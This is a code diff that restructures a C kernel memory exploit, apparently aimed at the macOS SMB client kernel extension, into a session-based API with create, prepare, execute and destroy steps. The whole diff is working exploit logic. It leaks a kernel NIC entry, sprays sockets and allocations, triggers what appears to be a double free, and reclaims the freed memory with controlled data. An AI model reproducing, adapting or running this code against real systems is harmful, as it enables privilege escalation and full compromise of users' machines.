@@ -20,9 +20,24 @@
 #include "allocator_nic_parallel.h"
 #include "zkext_neighbor_reader.h"
 #include "platform_constants.h"
-#include "util_binary.h"
 #include "util_misc.h"
 #include "util_dispatch.h"
+#include "util_log.h"
+
+
+struct kmem_zkext_free_session {
+    kmem_zkext_neighour_reader_t reader;
+    smb_nic_allocator nic_allocator;
+    kmem_allocator_nic_parallel_t capture_allocator;
+    
+    enum {
+        STATE_CREATED,
+        STATE_PREPARED,
+        STATE_DONE
+    } state;
+    
+    struct sockaddr_in smb_addr;
+};
 
 
 int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neighour_reader_t neighbor_reader, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
@@ -126,45 +141,30 @@ void kmem_zkext_free_kext_reserve_nics(smb_nic_allocator allocator, size_t count
 }
 
 
-void kmem_zkext_free_reserve_va(struct sockaddr_in* smb_addr) {
-    int num_reserved_pages = 70;
-    int num_768_allocs = XE_PAGE_SIZE * num_reserved_pages / (768 * 2);
-    int num_32_allocs = XE_PAGE_SIZE * num_reserved_pages / (32 * 2);
-    
-    kmem_allocator_rw_t rw_allocator = kmem_allocator_rw_create(smb_addr, num_768_allocs);
-    kmem_allocator_nic_parallel_t nic_allocator = kmem_allocator_nic_parallel_create(smb_addr, num_32_allocs);
-    
-    char* data = alloca(768);
-    kmem_allocator_nic_parallel_alloc(nic_allocator, data, 32-8);
-    
-    int error = kmem_allocator_rw_allocate(rw_allocator, num_768_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
-        *data1 = data;
-        *data1_size = 768;
-        *data2 = data;
-        *data2_size = 768;
-    }, NULL);
-    assert(error == 0);
-    kmem_allocator_nic_parallel_destroy(&nic_allocator);
-    error = kmem_allocator_rw_destroy(&rw_allocator);
-    assert(error == 0);
+kmem_zkext_free_session_t kmem_zkext_free_session_create(struct sockaddr_in* smb_addr) {
+    kmem_zkext_free_session_t session = malloc(sizeof(struct kmem_zkext_free_session));
+    session->reader = kmem_neighbor_reader_create();
+    session->smb_addr = *smb_addr;
+    session->nic_allocator = -1;
+    session->capture_allocator = NULL;
+    session->state = STATE_CREATED;
+    return session;
 }
 
 
-int kmem_zkext_free(struct sockaddr_in* smb_addr, uintptr_t tailq) {
-    kmem_zkext_neighour_reader_t neighbor_reader = kmem_neighbor_reader_create();
-    kmem_zkext_free_reserve_va(smb_addr);
+struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_session_t session) {
+    assert(session->state == STATE_CREATED);
     
     smb_nic_allocator nic_allocator;
-    kmem_allocator_rw_t temp_allocator = kmem_allocator_rw_create(smb_addr, XE_PAGE_SIZE * 70 / (768 * 2));
-    
     struct complete_nic_info_entry entry;
     int tries = 10;
     do {
-        nic_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
-        int error = kmem_zkext_free_kext_leak_nic(nic_allocator, neighbor_reader, smb_addr, &entry);
+        XE_LOG_DEBUG("attempt to capture nic");
+        nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
+        int error = kmem_zkext_free_kext_leak_nic(nic_allocator, session->reader, &session->smb_addr, &entry);
         if (error) {
             smb_nic_allocator_destroy(&nic_allocator);
-            kmem_zkext_neighbor_reader_reset(neighbor_reader);
+            kmem_zkext_neighbor_reader_reset(session->reader);
         } else {
             break;
         }
@@ -173,41 +173,54 @@ int kmem_zkext_free(struct sockaddr_in* smb_addr, uintptr_t tailq) {
     assert(tries >= 0);
     assert(entry.next.prev != 0);
     
-    printf("%p\n", entry.addr_list.next);
-    
-    entry.addr_list.next = NULL;
-    entry.addr_list.prev = NULL;
-    
-    char* data = alloca(768);
-    memset(data, 0xff, 768);
-    int error = kmem_allocator_rw_allocate(temp_allocator, XE_PAGE_SIZE * 70 / (768 * 2), ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
-        *data1 = data;
-        *data1_size = 768;
-        *data2 = data;
-        *data2_size = 768;
-    }, NULL);
-    assert(error == 0);
-    
-    printf("%p\n", entry.next.next);
+    session->nic_allocator = nic_allocator;
+    session->state = STATE_PREPARED;
+    return entry;
+}
+
+
+void kmem_zkext_free_session_execute(kmem_zkext_free_session_t session, struct complete_nic_info_entry* entry) {
+    assert(session->state == STATE_PREPARED);
     
     for (int i = 0; i < 100; i++) {
-        printf("%d / 100\n", i);
-        kmem_zkext_free_kext_allocate_sockets(nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
+        XE_LOG_DEBUG("allocate sockets for nic %d / %d", i, 100);
+        kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
     }
 
-    kmem_zkext_free_kext_allocate_sockets(nic_allocator, (uint32_t)entry.nic_index, 512, 96);
-    
-    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(smb_addr, 1024 * 500);
+    kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
+    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 500);
 
+    dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
         struct network_nic_info info;
         bzero(&info, sizeof(info));
-        info.nic_index = (uint32_t)entry.nic_index;
-        int error = smb_nic_allocator_allocate(nic_allocator, &info, 1, sizeof(info));
-        assert(error == 0);
+        info.nic_index = (uint32_t)entry->nic_index;
+        int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
+        assert(error == ENOMEM);
+        dispatch_semaphore_signal(sem_dbf_trigger);
     });
     
-    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)&entry) + 8, 88);
+    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)entry) + 8, 88);
+    dispatch_semaphore_wait(sem_dbf_trigger, DISPATCH_TIME_FOREVER);
     
-    return 0;
+    session->capture_allocator = capture_allocator;
+    session->state = STATE_DONE;
 }
+
+
+void kmem_zkext_free_session_destroy(kmem_zkext_free_session_t* session_p) {
+    kmem_zkext_free_session_t session = *session_p;
+    
+    if (session->nic_allocator >= 0) {
+        smb_nic_allocator_destroy(&session->nic_allocator);
+    }
+    
+    if (session->capture_allocator) {
+        kmem_allocator_nic_parallel_destroy(&session->capture_allocator);
+    }
+    
+    kmem_zkext_neighbor_reader_destroy(&session->reader);
+    free(session);
+    *session_p = NULL;
+}
+
